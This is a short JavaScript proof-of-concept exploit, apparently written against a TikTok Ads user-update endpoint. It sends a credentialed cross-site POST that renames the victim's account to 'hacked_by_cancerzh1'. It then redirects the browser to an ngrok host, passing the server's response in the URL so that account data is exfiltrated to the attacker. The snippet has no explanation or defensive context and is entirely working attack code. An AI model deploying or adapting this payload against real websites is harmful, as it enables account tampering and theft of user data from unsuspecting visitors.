var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://ads.tiktok.com/web/user/update/user_info/");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('aid=1583&language=en&account_sdk_source=web&fp=verify_ldg8d6wz_dJfbg8DW_Ni91_4lTb_Be17_4vSJJFLGIAm6&name=hacked_by_cancerzh1');

function reqListener() {
    location='//11b0-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
